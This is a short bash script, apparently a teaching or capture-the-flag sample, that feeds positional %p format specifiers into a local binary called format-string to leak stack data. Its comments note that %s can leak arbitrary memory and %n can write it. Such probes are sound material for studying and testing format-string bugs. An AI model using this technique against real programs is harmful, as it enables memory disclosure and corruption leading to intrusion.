#!/bin/bash

# this sample shows how to use printf and %p leak stack data
# you can use %s to leak abritrary memory, use %n to write abritrary memory

for i in $(seq 1 20); do
	payload="%$i\$p"
	(
		echo $payload
		echo $((0x1337))
	) | ./format-string
done
